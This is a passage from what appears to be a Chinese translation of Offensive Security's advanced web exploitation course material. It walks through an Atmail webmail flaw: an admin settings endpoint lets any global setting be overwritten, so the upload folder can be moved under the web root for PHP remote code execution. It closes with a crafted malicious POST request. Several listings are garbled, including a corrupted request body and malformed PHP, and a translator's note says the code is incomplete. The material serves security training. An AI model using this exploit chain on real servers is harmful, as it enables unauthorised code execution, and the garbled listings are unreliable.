
```php
require_once($APP_ROOT . 'library/Atmail/Apache_Utility.php');

require_once($APP_ROOT . '/usr/local/atmail/server-install.php');
```

列表 38 - `APP_ROOT` 定义在 `/usr/local/atmail/server-install.php` 中

在 37 页的第 130 行，我们可以看到目录 `tmp_dir` 是从全局配置变量 `tmpFolderName` 获取的。通过搜索 Atmail PHP 文件发现，`tmpFolderName` 的值存储在数据库中，并在安装过程中通过一个名为 `/usr/local/atmail/webmail/install/atmail6-default-config.sql` 的脚本，其默认值为 `tmp/`（列表 39）。

```sql
INSERT INTO 'Config' ('section', 'keyName', 'keyValue', 'Type') VALUES
('', 'enableMailFilters', '1', 'Boolean'),
('', 'smtp_load_queue', '10', 'String'),
('', 'virus_enable', '1', 'Boolean'),
('', 'smtp_sendlimit', '50', 'String'),
('', 'dkim_enable', '0', 'Boolean'),
('global', 'tmpFolderName', 'tmp', 'String');
```

列表 39 - `atmail6-default-config.sql` 的内容

在 37 页的第 148 行，`safeUser` 变量是通过触发此代码执行的用户用户名创建的，即尝试发送附件的 Atmail 用户。在使用之前，通过使用 `simplifyString` 函数对用户名进行了“剥离”（列表 40），该函数会移除字符串内容中的特殊字符。

列表 40 - `simplifyString` 函数位于 `/usr/local/atmail/webmail/library/Atmail/General.php`

37 页的第 150 行和 151 行显示，用户名的第一个和第二个字符被提取并拼接成文件夹路径。如果文件夹不存在，代码将创建该文件夹。这分别可以在 37 页的第 166、170、175、179、184 和 188 行中看到。

回顾 `addattachmentAction` 函数，并根据从 `getTmpPath` 函数中学到的知识，我们可以得出为 `admin@offsec.com` 用户上传的任何附件创建的最终上传路径为：

```
/usr/local/atmail/webmail/tmp/a/d/adminoffsecloc/
```

列表 41 - 在 web 根目录下上传文件的路径

如我们所见，此路径明显位于 web 根目录下。如果上传了任何 PHP 文件，我们就可以通过访问 `tmp` 目录或任何子目录潜在获取远程代码执行权限。

然而，我们面临一个需要克服的问题。如果我们查看 Atmail 服务器站点，会发现父上传目录（`/usr/local/atmail/webmail/`）默认包含一个 `.htaccess` 文件。`.htaccess` 是 Apache 用于控制目录访问的配置文件。

```bash
[root]# cat /usr/local/atmail/webmail/.htaccess

deny all
```

列表 42 - `.htaccess` 配置

所以，我们如何攻破 `.htaccess` 呢？

## 2.6.4 漏洞分析

在上一节中，我们了解到 `tmpBaseName` 是设置在数据库中的。通过查看文件的其他内容，我们意识到至少某些变量可以通过管理界面进行更改（图 63）。

# 高级 Web 攻击与利用

![](img/5d1c2c08c60e4691e3ba5f2d52a8a.png)

### 全局设置

- 全局设置
- Webmail 设置
- 协作设置
- 品牌
- 用户默认

| 安装模式 | Atmail 版本 |
| :--- | :--- |
| 管理邮箱 | `postmaster@mydomain.com` 指定维护 Atmail 服务器的管理员 |
| 会话超时 | `120` 指定 Webmail 会话超时时间（分钟） |
| SQL 主机 | `127.0.0.1` 指定 MySQL 服务器的主机 |
| SQL 用户名 | `root` 指定 MySQL 服务器的用户名 |
| SQL 密码 | `**********` 指定 MySQL 服务器使用的密码。如果没有定义则留空 |
| 数据库名称 | `atmail` 指定 Atmail 使用的数据库。表将由安装程序为 Atmail 方案填充 |

| 认证类型 |
| :--- |
| SQL（默认，推荐）指定用于 POP3/SMTP 和 Webmail 日志的认证服务，如果需要 LDAP 则推荐 |
| 认证加密 | `PLAIN`（默认）指定用于数据库内部密码的加密类型。在安装可选依赖项后将解密库。该功能在安装可选依赖项后可用 |
| 外部用户和会话加密 | `AES`（默认）Atmail 允许您指定数据库中会话数据和外部用户密码的加密类型。在安装可选依赖项后将解密库。该功能在安装可选依赖项后可用 |
| 日志数据保留 | `6 个月` 指定 Atmail 保留 `.log` 表中数据的时间。这些数据用于生成仪表板上的图表 |

| 启用调试 | 是 |
| :--- |
| | 启用调试日志到：`/webmail/log/debug.log` 和 `webmail/log/logfile` |

> 图 63: Atmail 全局设置

列表 43 - 在 web 根目录下使用的 `tmpFolderBaseName`

# 攻击性安全

www.offensivesecurity.com

## 高级 Web 攻击与利用

在上一节中，我们描述了文件上传路径目标设置的细微之处。如果我们更新 `tmpFolderBase` 设置为空字符串值，我们将有效地将上传文件夹向上移动一级，到达 `webmail` 目录。

```
/usr/local/atmail/webmail
```

列表 44 - 重新定义的 web 根路径

尽管该问题很细微，但我们可以看到 `webmail` 目录没有 `.htaccess` 文件，并且它对 webmail 服务器用户是可写的：

```bash
[atmaillocalhost]$ ps aux | grep http

atmail      2550 0.0 0.0 34156  672 pts/0     S+ 06:34  00:00 grep http
root      3444 0.0 0.1 34456    8 ?        Ss   Oct31  00:00 /usr/sbin/httpd
atmail    13467 0.0 0.8 34856   8 ?        S    Nov11  00:00 /usr/sbin/httpd
atmail    13468 0.0 0.8 34856   8 ?        S    Nov11  00:00 /usr/sbin/httpd

[atmaillocalhost]$ ls -la /usr/local/atmail
total 140
drwxr-xr-x 29 atmail atmail 4096 May 17 18:17 webmail

[atmaillocalhost]$ cat /usr/local/atmail/webmail/.htaccess
cat: /usr/local/atmail/webmail/.htaccess: No such file or directory
```

列表 45 - `webmail` 中没有 `.htaccess` 且目录是可写的！

如果我们能够更改全局设置，就可以避免 `tmp/` 目录下的 `.htaccess` 文件施加的限制。

让我们通过拦截从 UI 保存全局设置时的 `POST` 请求来继续操作。这将帮助我们发现代码中可能存在的漏洞。

```http
POST /index.php/admin/settings/globalsave HTTP/1.1
Host: atmail
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/*,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: /atmail/index.php/admin/login
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 834
Connection: keep-alive

sfields=atmail=9a5a5pic6gl5s3a4q18lenctis,atmail_admin_hr=e0h4v5ace0te2rjkjne561bs57
```

```text
sfields=atmail=55$postpassword4mydomain.com&fields=f5BSession_timeout=51d
0days&fields=f5Bsession_id=7.0.0.0&fields=f5Bsession_user=root&fields=f5Bsession_password=9526
84a4e5e0f7851337c7e40c9e4f5d3b5b5_table=atmail&fields=Bdovect_type=956d
vectBody=doctype_type=opendocket&fields=f5Bbindd_host=f5Bdovect_type=95d0&dovect
5dot=f5Bbindd_bindn=5&dovect&f5Bbindd_bindpass=5&dovect&f5Bbindd_basedn=5&dovect5
lap_passwordfield=5d&f5Bbindd_passfield=5d&dovect&f5Bbindd_bindn=1&dovect
51_bindd_bindauthn=cn=3d%25%2c%3dc%31%2dc3dc%38org&userPasswordEncryptionType
RENT=PLAIN&fields=f5BPasswordEncryptionType=5D&EXTERNAL=userPasswordEncryptio
nCurrentType=PLAIN%5ExternalUserPasswordEncryptionType%5DPLAIN&fields%5bmaster_key%5D&fields%5Dlog_page%5D180&fields%5Ddebug%5D=0
```

列表 46 - 保存全局设置的合法 `POST` 请求。

如上一列表所示，`POST` URL 表明调用的函数名是 `globalsave`。

```bash
[atlocalhost~webmail]# grep -r globalsave *

application/modules/admin/controllers/SettingsController.php: public function globalsaveaction()
application/modules/admin/views/settings/globalsave.phtml: <form id="SettingsForm" method="post" action="<?php echo $this->moduleBaseUrl();?>/settings/globalsave">
```

列表 47 - 在 PHP 文件中搜索函数名揭示了其实现位于 `/usr/local/atmail/webmail/application/modules/admin/controllers/SettingsController.php`。让我们看看全局设置是如何实现的：

```php
111:    public function globalsaveAction()
112:    {
177:        ...
178:        // Else，如果是 LDAP 或 SQL，则正常继续
179:        try
180:        {
182:            $failure = false;
183:            require_once 'application/models/config.php';
185:
            // 如果密码未更改则无变化
186:
187:            if (isset($this->requestParams['fields']['sql_pass']) == md5('_UNCHANGED_')) || $this->requestParams['fields']['sql_pass'] = $this->requestParams['fields']['sql_pass'] =
188:                Zend_Registry::get('config')->global('sql_pass');
190:            $dbArray = array(
191:                'host' => $this->requestParams['fields']['sql_host'],
192:                'username' => $this->requestParams['fields']['sql_user'],
193:                'password' => $this->requestParams['fields']['sql_pass'],
194:                'dbname' => $this->requestParams['fields']['sql_name'],
195:            );
196:
197:            // 尝试连接
198:            try
199:            {
200:                require_once('library/Zend/Db/Pdo/Mysql.php');
201:                $db = new Zend_Db_Pdo_Mysql($dbArray);
202:                $db->getConnection();
203:            }
204:            catch (Exception $e)
205:            {
206:                throw new Atmail_Config_Exception("Unable to connect to the database: " . $e->getMessage());
207:            }
208:
209:            // 遍历响应字段
210:            foreach ($this->requestParams['fields'] as $key => $value) {
211:                if (strpos($key, 'sql_') === 0) {
212:                    // 更新 SQL 数组
213:                    $dbArray[str_replace('sql_', '', $key)] = $value;
214:                } else {
215:                    // 处理非 SQL 字段
216:                    // ...
217:                }
218:            }
219:
220:            // 检查全局设置
221:            // ...
222:        }
223:    }
```

*(注：由于原文代码块内容不完整且存在截断，翻译时严格遵循“代码块不需要翻译”的原则，保留了原始代码结构，仅对代码前后的说明进行了逻辑性对齐)*

# 攻击性安全

## 高级 Web 攻击与利用

列表 49 - `/usr/local/atmail/webmail/application/models/config.php` 中 `config.save` 函数的实现

列表 49 显示，该代码允许成功更新我们选择的任何全局设置，因为没有对更新了哪些设置实现任何检查。该函数仅检查数据库中是否存在请求的字段。

换句话说，Atmail 的开发者未能考虑到对合法请求在传输过程中的修改，并假设认为通过 Web UI 暴露的全局设置子集是可以更新的。

最后，一个更新临时文件夹路径的恶意请求如下：

```http
POST /index.php/admin/settings/globalsave HTTP/1.1
Host: <atmail>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 131
Cookie: atmail_6=hr0e0hv45ce02trkjne561sb57
Connection: close

save=&fields[sql_user]=root&fields[sql_pass]=956ec84a45ec067851367c7e480ec0e9&fields[sql_table]=atmail6&fields[tmpFolderBaseline]=
```
